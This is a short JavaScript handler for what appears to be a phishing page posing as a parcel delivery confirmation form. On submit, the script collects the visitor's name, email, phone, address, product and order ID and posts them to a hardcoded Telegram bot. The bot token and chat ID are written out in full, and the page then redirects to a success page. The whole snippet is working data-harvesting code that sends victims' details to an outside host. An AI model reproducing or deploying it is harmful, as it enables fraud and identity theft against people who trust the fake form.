<script>
  document.getElementById('confirmForm').addEventListener('submit', function(e) {
    e.preventDefault();

    const fullName = document.getElementById("fullName").value;
    const email = document.getElementById("email").value;
    const phone = document.getElementById("phone").value;
    const deliveryAddress = document.getElementById("deliveryAddress").value;
    const productName = document.getElementById("productName").value;
    const orderID = document.getElementById("orderID").value || "N/A";

    const message = `
ðŸ“¦ *New Delivery Confirmation*

ðŸ‘¤ Full Name: ${fullName}
ðŸ“§ Email: ${email}
ðŸ“ž Phone: ${phone}
ðŸ  Address: ${deliveryAddress}
ðŸ“¦ Product: ${productName}
ðŸ†” Order ID: ${orderID}
`;

    const botToken = "7813235070:AAGEOAio5gWtoiNZz9MF-dzictp7vZ4erWA";
    const chatId = "7175428395";

    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: "Markdown"
      })
    })
    .then(response => response.json())
    .then(data => {
      if (data.ok) {
        window.location.href = "success.html";
      } else {
        alert("Failed to send. Try again.");
      }
    })
    .catch(error => {
      console.error("Error:", error);
      alert("Something went wrong.");
    });
  });
</script>
